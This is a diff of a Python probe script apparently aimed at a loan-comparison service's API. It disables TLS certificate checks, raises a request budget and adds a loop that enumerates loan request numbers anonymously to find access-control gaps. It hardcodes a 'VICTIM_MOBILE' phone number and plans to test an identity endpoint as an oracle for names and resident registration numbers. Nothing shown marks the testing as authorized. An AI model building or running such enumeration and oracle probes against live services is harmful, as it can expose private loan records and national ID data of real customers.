@@ -26,7 +26,7 @@ CTX = ssl.create_default_context()
 CTX.check_hostname = False
 CTX.verify_mode = ssl.CERT_NONE
 PACE = 0.5
-BUDGET = [28]
+BUDGET = [40]
 LOGF = os.path.join(HERE, "callback_probe_log.jsonl")
 
 VICTIM_MOBILE = "01040039341"
@@ -87,6 +87,12 @@ def main():
     for m, p, pl, eh in tests:
         st, body = req(m, p, pl, eh)
         log(f"{m} {p[:95]} -> http={st} {body[:200]}")
+        time.sleep(PACE)
+
+    # loan-list-check: does loReqtNo enumeration work anonymously? Shape probe.
+    for lr in ("1", "100", "1000000", "2026102700000000001", "TXN202610270001"):
+        st, body = req("POST", f"/api/bigyo/loan-list-check?loReqtNo={lr}", None, None)
+        log(f"LCHK-ANON {lr} -> http={st} {body[:200]}")
         time.sleep(PACE)
 
     # Nice-UsrAuth WITH member token: is it an online name+RRN verify oracle?
